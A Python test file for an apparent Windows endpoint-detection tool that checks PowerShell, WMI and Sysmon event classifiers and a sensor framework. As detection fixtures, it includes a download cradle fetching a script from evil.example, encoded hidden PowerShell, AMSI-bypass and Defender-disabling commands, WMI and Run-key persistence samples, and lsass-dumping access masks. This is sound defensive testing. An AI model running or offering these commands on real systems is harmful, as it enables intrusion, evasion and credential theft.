"""Tests for the real-time ETW-backed sensor framework and PowerShell sensor.

Runs standalone (`python tests/test_etw_sensors.py`) or under pytest. The pure
classifier, XML parser, and framework tests run on any OS; the live-channel
smoke test self-skips off Windows or when the channel is unavailable.
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from valkyrie.etw.framework import Sensor, SensorManager          # noqa: E402
from valkyrie.etw.powershell import PowerShellSensor, classify_powershell  # noqa: E402
from valkyrie.etw.wmi import WmiActivitySensor, classify_wmi      # noqa: E402
from valkyrie.etw.sysmon import (                                  # noqa: E402
    SysmonSensor, classify_sysmon, parse_hashes,
)
from valkyrie.etw.wineventlog import parse_event_xml, record_id_of  # noqa: E402
from valkyrie.telemetry import (                                   # noqa: E402
    ACT_FLAGGED, CAT_NETWORK, CAT_PERSISTENCE, CAT_PROCESS, PERSIST_WMI,
    SEV_HIGH, SEV_INFO, SEV_MEDIUM, TelemetryEvent, severity_rank,
)


def _sysmon_xml(eid: int, data: dict) -> str:
    rows = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in data.items())
    return (f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
            f"<System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>{eid}</EventID>"
            f"<EventRecordID>1</EventRecordID><Execution ProcessID='4' ThreadID='4'/>"
            f"<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>H</Computer>"
            f"<Security UserID='S-1-5-18'/></System><EventData>{rows}</EventData></Event>")

IS_WIN = sys.platform.startswith("win")

# A realistic PowerShell 4104 script-block event.
SAMPLE_4104 = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
 <System>
  <Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/>
  <EventID>4104</EventID>
  <Level>5</Level>
  <Task>2</Task>
  <TimeCreated SystemTime='2026-07-18T12:00:00.000000000Z'/>
  <EventRecordID>987654</EventRecordID>
  <Execution ProcessID='4242' ThreadID='8080'/>
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  <Computer>TESTHOST</Computer>
  <Security UserID='S-1-5-21-1-2-3-1001'/>
 </System>
 <EventData>
  <Data Name='MessageNumber'>1</Data>
  <Data Name='MessageTotal'>1</Data>
  <Data Name='ScriptBlockText'>IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')</Data>
  <Data Name='ScriptBlockId'>11111111-2222-3333-4444-555555555555</Data>
  <Data Name='Path'></Data>
 </EventData>
</Event>"""


# --- classifier ---
def test_classify_encoded_command_high():
    sev, labels, tech, _ = classify_powershell(
        "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=")
    assert sev == SEV_HIGH
    assert "encoded_command" in labels
    assert tech.startswith("T1027")


def test_classify_download_cradle():
    sev, labels, tech, _ = classify_powershell(
        "IEX (New-Object Net.WebClient).DownloadString('http://x/y')")
    assert severity_rank(sev) >= severity_rank(SEV_MEDIUM)
    assert "download" in labels and "dynamic_exec" in labels


def test_classify_amsi_and_defender_are_high():
    assert classify_powershell("[Ref].Assembly.GetType('...AmsiUtils')")[0] == SEV_HIGH
    assert classify_powershell("Set-MpPreference -DisableRealtimeMonitoring $true")[0] == SEV_HIGH


def test_classify_benign_is_info():
    sev, labels, _, _ = classify_powershell("Get-ChildItem C:\\Users | Sort-Object Name")
    assert sev == SEV_INFO and labels == []


# --- XML parsing ---
def test_parse_event_xml_extracts_fields():
    ev = parse_event_xml(SAMPLE_4104)
    assert ev["event_id"] == 4104
    assert ev["record_id"] == 987654
    assert ev["process_id"] == 4242
    assert ev["user_sid"] == "S-1-5-21-1-2-3-1001"
    assert "DownloadString" in ev["data"]["ScriptBlockText"]
    assert ev["data"]["ScriptBlockId"].startswith("11111111")


def test_record_id_of():
    assert record_id_of(SAMPLE_4104) == 987654
    assert record_id_of("<garbage/>") == 0


def test_parse_bad_xml_returns_empty():
    assert parse_event_xml("not xml <<<") == {}


# --- PowerShell sensor mapping ---
def test_powershell_sensor_emits_event():
    captured = []
    s = PowerShellSensor()
    s.bind(captured.append)
    s._emit_event(parse_event_xml(SAMPLE_4104))
    assert len(captured) == 1
    ev = captured[0]
    assert isinstance(ev, TelemetryEvent)
    assert ev.category == CAT_PROCESS and ev.activity == "script_block"
    assert ev.actor_pid == 4242
    assert ev.action == ACT_FLAGGED           # download+IEX => medium => flagged
    assert ev.fields["_dedup"].startswith("11111111")
    assert "download" in ev.labels


# --- WMI-Activity sensor (UserData + persistence) ---
SAMPLE_5861 = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
 <System>
  <Provider Name='Microsoft-Windows-WMI-Activity' Guid='{1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}'/>
  <EventID>5861</EventID>
  <TimeCreated SystemTime='2026-07-18T12:00:00.0Z'/>
  <EventRecordID>555</EventRecordID>
  <Execution ProcessID='2200' ThreadID='3300'/>
  <Channel>Microsoft-Windows-WMI-Activity/Operational</Channel>
  <Computer>HOST</Computer>
  <Security UserID='S-1-5-18'/>
 </System>
 <UserData>
  <Operation_ESStoConsumerBinding xmlns='http://x'>
   <PossibleCause>__FilterToConsumerBinding registered. Consumer = CommandLineEventConsumer="Updater"; CommandLineTemplate = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQAgAFgAWABYAA=="; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60"; Namespace = "//./root/subscription"</PossibleCause>
  </Operation_ESStoConsumerBinding>
 </UserData>
</Event>"""


def test_parse_userdata_extracts_fields():
    ev = parse_event_xml(SAMPLE_5861)
    assert ev["event_id"] == 5861
    assert ev["operation"] == "Operation_ESStoConsumerBinding"
    assert "CommandLineEventConsumer" in ev["data"]["PossibleCause"]


def test_classify_wmi_command_consumer_is_high():
    sev, labels, tech, _ = classify_wmi(
        'Consumer = CommandLineEventConsumer="x" __FilterToConsumerBinding '
        'Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60"')
    assert sev == SEV_HIGH
    assert "wmi_command_consumer" in labels and "persistence_wmi" in labels
    assert tech.startswith("T1546.003")


def test_classify_wmi_benign_binding_is_not_info():
    sev, labels, _, _ = classify_wmi("__FilterToConsumerBinding for a normal consumer")
    assert severity_rank(sev) >= severity_rank(SEV_MEDIUM)
    assert "persistence_wmi" in labels


def test_wmi_sensor_emits_persistence_event():
    captured = []
    s = WmiActivitySensor()
    s.bind(captured.append)
    s._emit_event(parse_event_xml(SAMPLE_5861))
    assert len(captured) == 1
    ev = captured[0]
    assert ev.category == CAT_PERSISTENCE and ev.activity == PERSIST_WMI
    assert ev.action == ACT_FLAGGED
    assert "wmi_command_consumer" in ev.labels
    assert "CommandLineEventConsumer" in ev.fields["consumer"]
    assert "powershell" in ev.target["command"].lower()


# --- Sysmon sensor ---
def test_parse_hashes():
    h = parse_hashes("SHA256=ABCDEF,MD5=123,IMPHASH=999")
    assert h["sha256"] == "abcdef" and h["imphash"] == "999"


def test_sysmon_lsass_access_is_high():
    args = classify_sysmon(10, {
        "SourceProcessId": "6666", "SourceImage": r"C:\Temp\mimi.exe",
        "TargetProcessId": "700", "TargetImage": r"C:\Windows\System32\lsass.exe",
        "GrantedAccess": "0x1410"})
    assert args is not None
    assert args["severity"] == SEV_HIGH
    assert "lsass_access" in args["labels"] and "credential_access" in args["labels"]


def test_sysmon_ignores_non_lsass_access():
    assert classify_sysmon(10, {"TargetImage": r"C:\Windows\explorer.exe",
                                "GrantedAccess": "0x1410"}) is None


# --- Generalisation: HELD-OUT masks not in the enumerated list ---
# The detector used to key on an exact set of six masks. These masks are NOT in
# that set, so under the old code they would have scored only MEDIUM and slipped
# under the alert bar - the exact "attacker changes one flag and evades" gap. A
# novel dumper still needs PROCESS_VM_READ (0x10) to read lsass memory, so the
# generalised check must catch all of them at HIGH.
def test_sysmon_lsass_heldout_masks_still_high():
    for novel in ("0x1018", "0x0410", "0x0010", "0x1418", "0x143b"):
        args = classify_sysmon(10, {
            "SourceImage": r"C:\Temp\newtool.exe",
            "TargetImage": r"C:\Windows\System32\lsass.exe",
            "GrantedAccess": novel})
        assert args is not None, novel
        assert args["severity"] == SEV_HIGH, f"{novel} should be HIGH (has VM_READ)"


# FP boundary: a query-only open of lsass (no VM_READ - cannot read memory) must
# NOT be escalated to HIGH. This is how the generalisation stays precise:
# "reads lsass memory" is credential theft, "queries lsass info" is routine.
def test_sysmon_lsass_query_only_not_escalated():
    for benign in ("0x1000", "0x0400", "0x1400"):   # QUERY_* without 0x10
        args = classify_sysmon(10, {
            "SourceImage": r"C:\Windows\System32\svchost.exe",
            "TargetImage": r"C:\Windows\System32\lsass.exe",
            "GrantedAccess": benign})
        assert args is not None
        assert args["severity"] != SEV_HIGH, f"{benign} has no VM_READ, must not be HIGH"


def test_sysmon_remote_thread_injection_high():
    args = classify_sysmon(8, {"SourceProcessId": "5", "SourceImage": r"C:\a.exe",
                               "TargetProcessId": "9", "TargetImage": r"C:\b.exe"})
    assert args["severity"] == SEV_HIGH and "remote_thread_injection" in args["labels"]


def test_sysmon_process_emits_only_when_suspicious_with_context():
    # Benign process (notepad from System32, benign parent) -> skipped.
    assert classify_sysmon(1, {"ProcessId": "1", "Image": r"C:\Windows\System32\notepad.exe",
                               "ParentImage": r"C:\Windows\explorer.exe"}) is None
    # Office -> PowerShell -> suspicious, enriched with context.
    args = classify_sysmon(1, {
        "ProcessId": "4321",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell -nop -w hidden -enc AAAA",
        "IntegrityLevel": "High", "User": "DOM\\u", "Hashes": "SHA256=ABCDEF",
        "Company": "Microsoft", "OriginalFileName": "PowerShell.EXE",
        "ParentImage": r"C:\Program Files\Microsoft Office\WINWORD.EXE"})
    assert args is not None and severity_rank(args["severity"]) >= severity_rank(SEV_HIGH)
    assert args["context"]["sha256"] == "abcdef"
    assert args["context"]["integrity_level"] == "High"
    assert "WINWORD.EXE" in args["context"]["parent_image"]


def test_sysmon_eid1_emits_discovery_labels_for_the_burst_combiner():
    """Discovery commands must survive EID 1's severity gate.

    They are INFO by design (a lone `whoami` must never alert), so the gate
    would normally drop them - but the reconnaissance-burst sequence IOA can
    only fire if it SEES several of them, and these commands exit in
    milliseconds, so Sysmon EID 1 / Security 4688 is the only source that
    reliably catches them at all. The 2s poller loses the race. If EID 1
    dropped them, the burst detector would be dead on every Sysmon host.
    """
    for image, cmdline, tid in (
            (r"C:\Windows\System32\systeminfo.exe", "systeminfo.exe", "T1082"),
            (r"C:\Windows\System32\tasklist.exe", "tasklist.exe /v", "T1057"),
            (r"C:\Windows\System32\net.exe", "net view /all", "T1018")):
        args = classify_sysmon(1, {
            "ProcessId": "77", "Image": image, "CommandLine": cmdline,
            "ParentImage": r"C:\Windows\System32\cmd.exe"})
        assert args is not None, f"{cmdline} was dropped by the EID 1 gate"
        assert "discovery_command" in args["labels"]
        assert tid in args["technique"]
        # Still INFO - this must not become a standalone alert.
        assert args["severity"] == SEV_INFO

    # A benign non-discovery process is still dropped (gate unchanged).
    assert classify_sysmon(1, {"ProcessId": "1",
                               "Image": r"C:\Windows\System32\notepad.exe",
                               "ParentImage": r"C:\Windows\explorer.exe"}) is None


def test_sysmon_unsigned_image_load():
    args = classify_sysmon(7, {"Image": r"C:\app.exe", "ImageLoaded": r"C:\Temp\evil.dll",
                               "Signed": "false", "SignatureStatus": "Unavailable",
                               "Hashes": "SHA256=DEAD"})
    assert args["severity"] == SEV_MEDIUM and "unsigned_module" in args["labels"]
    # A properly signed module is not emitted.
    assert classify_sysmon(7, {"ImageLoaded": r"C:\Windows\System32\kernel32.dll",
                               "Signed": "true", "SignatureStatus": "Valid"}) is None


def test_sysmon_registry_run_key_persistence():
    args = classify_sysmon(13, {
        "ProcessId": "2", "Image": r"C:\evil.exe", "EventType": "SetValue",
        "TargetObject": r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
        "Details": r"C:\evil.exe"})
    assert args["category"] == CAT_PERSISTENCE and "persistence_run_key" in args["labels"]


def test_sysmon_external_network_emitted_private_skipped():
    ext = classify_sysmon(3, {"Initiated": "true", "DestinationIp": "93.184.216.34",
                              "DestinationPort": "443", "Image": r"C:\bad.exe"})
    assert ext is not None and ext["category"] == CAT_NETWORK
    assert classify_sysmon(3, {"Initiated": "true", "DestinationIp": "192.168.1.5"}) is None


def test_sysmon_sensor_emit_end_to_end():
    captured = []
    s = SysmonSensor(); s.bind(captured.append)
    ev = parse_event_xml(_sysmon_xml(10, {
        "SourceProcessId": "6666", "SourceImage": r"C:\Temp\mimi.exe",
        "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1410"}))
    args = classify_sysmon(ev["event_id"], ev["data"])
    s._emit(ev, args)
    assert len(captured) == 1
    te = captured[0]
    assert te.source == "etw.sysmon" and te.action == ACT_FLAGGED
    assert te.fields["technique"].startswith("T1003.001")


# --- framework: dedup ---
def _ev(dedup="x", pid=1):
    return TelemetryEvent(category=CAT_PROCESS, activity="script_block",
                          actor_pid=pid, fields={"_dedup": dedup})


def test_dedup_collapses_repeats():
    mgr = SensorManager(sink=lambda e: None, dedup_window=5.0)
    assert mgr._is_duplicate(_ev("A")) is False
    assert mgr._is_duplicate(_ev("A")) is True       # same fingerprint within window
    assert mgr._is_duplicate(_ev("B")) is False      # different


def test_dedup_expires_after_window():
    mgr = SensorManager(sink=lambda e: None, dedup_window=0.2)
    assert mgr._is_duplicate(_ev("A")) is False
    time.sleep(0.3)
    assert mgr._is_duplicate(_ev("A")) is False       # window elapsed -> not dup


# --- framework: bounded backpressure ---
def test_backpressure_is_bounded():
    mgr = SensorManager(sink=lambda e: None, queue_max=5)
    for i in range(20):
        mgr._submit(_ev(str(i)))
    assert len(mgr._q) <= 5                            # memory bounded
    assert mgr.metrics["dropped_backpressure"] >= 10   # overflow counted


# --- framework: end-to-end dispatch + dedup to sink ---
def test_end_to_end_dispatch_dedup():
    got = []
    mgr = SensorManager(sink=got.append, dedup_window=5.0)
    mgr.start()
    try:
        mgr._submit(_ev("same"))
        mgr._submit(_ev("same"))         # duplicate -> dropped
        mgr._submit(_ev("other"))
        time.sleep(0.4)
    finally:
        mgr.stop()
    keys = {e.fields["_dedup"] for e in got}
    assert keys == {"same", "other"}
    assert mgr.metrics["dropped_dedup"] >= 1


# --- framework: watchdog restarts a dead sensor ---
class _DyingSensor(Sensor):
    name = "dying"

    def __init__(self):
        super().__init__()
        self.starts = 0

    def start(self):
        import threading
        self.starts += 1
        self._running = True
        # A thread that exits immediately, leaving _running True -> is_running()
        # is False, which the watchdog must notice and restart.
        self._thread = threading.Thread(target=lambda: None)
        self._thread.start()
        self._thread.join()


def test_watchdog_restarts_dead_sensor():
    mgr = SensorManager(sink=lambda e: None, watchdog_interval=0.2, max_restarts=3)
    s = _DyingSensor()
    mgr.register(s)
    mgr.start()
    try:
        time.sleep(1.0)                   # ~4 watchdog ticks
    finally:
        mgr.stop()
    assert s.starts >= 2                   # restarted at least once
    assert mgr.metrics["restarts"] >= 1


# --- framework: failure isolation ---
class _RaisingSensor(Sensor):
    name = "raiser"
    interval = 0.1

    def _collect_once(self):
        raise RuntimeError("boom")


class _GoodSensor(Sensor):
    name = "good"
    interval = 0.1

    def _collect_once(self):
        self.submit(_ev("good-" + str(time.time())))


def test_failure_isolation():
    got = []
    mgr = SensorManager(sink=got.append)
    mgr.register(_RaisingSensor())
    mgr.register(_GoodSensor())
    mgr.start()
    try:
        time.sleep(0.6)
    finally:
        mgr.stop()
    assert len(got) >= 1                   # good sensor kept producing
    assert mgr.is_healthy() in (True, False)  # never raised


# --- framework: clean shutdown drains ---
def test_clean_shutdown_joins():
    mgr = SensorManager(sink=lambda e: None)
    mgr.start()
    for i in range(50):
        mgr._submit(_ev(str(i)))
    mgr.stop()
    assert mgr._dispatch_thread is not None
    assert not mgr._dispatch_thread.is_alive()   # joined cleanly


# --- live smoke test (self-skips) ---
def test_live_channel_available_smoke():
    if not IS_WIN:
        print("SKIP live channel (non-Windows)")
        return
    s = PowerShellSensor()
    avail = s.available()
    print(f"PowerShell channel available: {avail}")
    if avail:
        s._collect_once()                 # baseline seed; must not raise


# --- benchmarks (measure, assert only sane bounds) ---
def test_benchmarks():
    N = 20000
    script = "IEX (New-Object Net.WebClient).DownloadString('http://x/y'); -enc AAAA"
    t0 = time.perf_counter()
    for _ in range(N):
        classify_powershell(script)
    dt = time.perf_counter() - t0
    print(f"[bench] classify_powershell: {N/dt:,.0f}/s ({dt*1e6/N:.1f} µs/event)")
    assert dt < 5.0

    t0 = time.perf_counter()
    for _ in range(N):
        parse_event_xml(SAMPLE_4104)
    dt = time.perf_counter() - t0
    print(f"[bench] parse_event_xml:    {N/dt:,.0f}/s ({dt*1e6/N:.1f} µs/event)")
    assert dt < 10.0

    # Dispatch throughput through the framework (dedup + sink).
    got = []
    mgr = SensorManager(sink=got.append, dedup_window=0.0, queue_max=100000)
    mgr.start()
    M = 20000
    t0 = time.perf_counter()
    for i in range(M):
        mgr._submit(_ev(str(i)))
    while len(got) < M and time.perf_counter() - t0 < 5:
        time.sleep(0.01)
    dt = time.perf_counter() - t0
    mgr.stop()
    print(f"[bench] framework dispatch: {len(got)/dt:,.0f}/s to sink")
    assert len(got) == M


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    passed = 0
    for fn in fns:
        try:
            fn()
            print(f"ok   {fn.__name__}")
            passed += 1
        except Exception as e:
            print(f"FAIL {fn.__name__}: {e}")
            raise
    print(f"\n{passed}/{len(fns)} passed")
